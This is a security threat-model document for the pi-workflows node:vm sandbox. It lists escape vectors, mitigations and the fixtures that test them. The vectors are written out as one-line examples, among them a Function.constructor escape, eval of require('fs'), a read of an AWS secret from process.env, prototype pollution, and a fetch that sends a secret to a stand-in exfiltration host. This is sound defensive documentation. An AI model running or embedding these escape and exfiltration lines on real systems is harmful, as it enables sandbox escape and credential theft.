# pi-workflows — Threat Model

This document describes the sandbox security model, the known escape
vectors, and the v1 mitigations. It mirrors PRD §8.

---

## Trust model (PRD §8.1)

pi-workflows is a **developer tool on a developer machine**. The
threat model is:

- **Trusted:** the author of the workflow file (it's your own JS).
- **Trusted:** the pi session running the workflow.
- **Untrusted on first run:** a workflow file from a new source (the
  approval flow gates this).
- **Not in scope:** malicious workflow files the user explicitly
  approves. That's the user's responsibility — the approval flow
  shows the source.

The sandbox is not a security boundary against a determined attacker who
can write files to your machine. It is a guardrail against **accidental
escalation** — a workflow calling `process.exit`, spawning subshells via
`require("child_process")`, or leaking sensitive env vars.

---

## Sandbox construction (PRD §8.2, §8.3)

Each workflow run gets a fresh `node:vm` Context:

```ts
const ctx = vm.createContext({}, { codeGeneration: { strings: false, wasm: false } });
```

`allowCodeGeneration.strings: false` blocks `eval(str)`, `new Function(str)`,
`setTimeout(str)`, and `setInterval(str)`. Wasm is also disabled.

### Allowed globals (PRD §4.3)

| Global | Notes |
|---|---|
| ECMAScript intrinsics | `Object`, `Array`, `Promise`, `Map`, `Set`, `WeakMap`, `WeakRef`, `Symbol`, `Proxy`, `Reflect`, `globalThis`, `undefined`, `NaN`, `Infinity`, `isNaN`, `isFinite`, `parseInt`, `parseFloat`, `encodeURI`, `decodeURI`, `encodeURIComponent`, `decodeURIComponent`, `JSON`, `Math`, `Date` |
| `Buffer` | host-realm ref (constructor-leak per §8.1) |
| `URL`, `URLSearchParams` | host-realm refs |
| `TextEncoder`, `TextDecoder` | host-realm refs |
| `atob`, `btoa` | host-realm refs |
| `crypto` | randomUUID, randomBytes, getRandomValues only — NOT `crypto.subtle` (v2) |
| `process` | frozen stub: `{ env: {}, platform, arch, versions: { node } }` |
| `console` | routes to `ctx.log()` — no host stdout leak |
| `setTimeout / setInterval / clearTimeout / clearInterval / setImmediate / clearImmediate / queueMicrotask` | host-side timer table (see §Timer bridge below) |
| `ctx` | the `WorkflowContext` object |

Everything else is absent. In particular: `require`, `import()`, `fs`,
`net`, `http`, `child_process`, `os`, `cluster`, `vm`, `module`,
`__dirname`, `__filename`, `Worker`, `Atomics`.

### Prototype freeze (PRD §8.3.2)

After the init script runs, the sandbox freezes `Object.prototype` and
all other built-in prototypes to block prototype-pollution attacks:

```js
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
// ... all built-in constructors
```

---

## Known escape vectors and mitigations

### 1. `Function.constructor` escape (PRD §8.3.4)

**Vector:** `({}).constructor.constructor("return process")()`

**Mitigation:** `allowCodeGeneration.strings: false`. The `Function`
constructor raises `EvalError` before executing the string. Verified by
`tests/security/fixtures/function-constructor.workflow.js`.

### 2. `eval` / `setTimeout(string)` escape

**Vector:** `eval("require('fs')")` or `setTimeout("require('fs')", 0)`

**Mitigation:** same as above — `allowCodeGeneration.strings: false`.

### 3. Dynamic `import()` escape

**Vector:** `import('./some-host-module.js')`

**Mitigation:** `import()` inside the Context sandbox is not available
(no module loader registered). Raises `TypeError`. Verified by
`tests/security/fixtures/dynamic-import.workflow.js`.

### 4. Host-input realm pierce (PRD §8.3.5)

**Vector:** the sandbox receives host-realm objects (errors, callbacks)
that carry references back to the host scope.

**Mitigation:** `rethrowAcrossRealm()` in `src/runtime/realmError.ts`
reconstructs errors in the Context realm before passing them to workflow
code. Callbacks passed to timer APIs use strict-mode arrows to strip
`this` binding. Verified by `tests/security/fixtures/host-input-realm.workflow.js`.

### 5. `process.env` leak via frozen stub (PRD §8.3.9)

**Vector:** `process.env.AWS_SECRET_ACCESS_KEY`

**Mitigation:** the sandbox's `process` is a frozen stub with an empty
`env: {}`. The host's `process` object is never mounted. Verified by
`tests/security/fixtures/process-env-leak.workflow.js`.

### 6. Prototype pollution (PRD §8.3.2)

**Vector:** `Object.prototype.isAdmin = true`

**Mitigation:** `Object.prototype` is frozen in the init script. Verified by
`tests/security/fixtures/prototype-pollution.workflow.js`.

### 7. Microtask escape (PRD §8.3.8)

**Vector:** `Promise.resolve().then(() => /* host realm code */)`

**Mitigation:** Promise microtasks execute in the Context realm by
construction — they can only access sandbox globals. Verified by
`tests/security/fixtures/microtask-escape.workflow.js`.

### 8. Timer callback `this` leak

**Vector:** timer callbacks receive host-realm `this` via non-strict
invocation, enabling realm escape through constructor.

**Mitigation:** timer-bridge arrows are `() => cb(...args)` — strict-mode
arrows bind `this === undefined`. Verified by `tests/security/fixtures/timer-escape.workflow.js`.

### 9. Network access via `fetch`

**Vector:** `fetch("https://exfil.example.com?data=" + secret)`

**Mitigation:** `fetch` is not mounted in the sandbox. Access raises
`ReferenceError`. Verified by `tests/security/fixtures/network-via-fetch.workflow.js`.

### 10. `require("module").createRequire` pierce

**Vector:** reach host Node module system via global `require` or
`createRequire`.

**Mitigation:** `require` is absent from the Context. `module` global
is absent. Verified by `tests/security/fixtures/require-resolve.workflow.js`.

### 11. Realm pierce via `toString` / stringification

**Vector:** `({}).constructor.constructor.toString()` to extract source,
then eval in host realm.

**Mitigation:** `allowCodeGeneration.strings: false` blocks the eval step.
The `toString` itself is harmless.

---

## Known limitations (v1 — deferred to v2)

### Synchronous infinite loop (PRD §8.3.6)

A `while(true){}` in workflow code wedges the entire Node event loop.
There is no watchdog timer that interrupts synchronous execution.

**v1 workaround:** user presses `Ctrl+C` to SIGINT pi.

**v2 plan:** move sandbox execution to a `worker_thread` with a
`SharedArrayBuffer` interrupt flag. Requires an async-only author API
surface and a deep re-architecture of the timer bridge.

### `crypto.subtle` (PRD §14 row 21)

Not exposed in v1. See [`docs/parity-gaps.md`](./parity-gaps.md).

### Host-realm constructor leak (PRD §8.1)

`Buffer.constructor`, `URL.constructor`, etc. return host-realm
constructors. These constructors are trusted (§8.1 — you already trust
the host). A workflow cannot escalate through them; they just expose
the fact that the sandbox shares the event loop with the host.

---

## Security test suite

All escape-vector assertions live in `tests/security/`:

- `tests/security/sandbox.security.test.ts` — main escape-vector matrix
- `tests/security/fixtures/*.workflow.js` — per-vector workflow fixtures
  (each fixture MUST NOT escape; any test that expects the fixture to
  *succeed* at escaping is a bug in the test, not the mitigation)
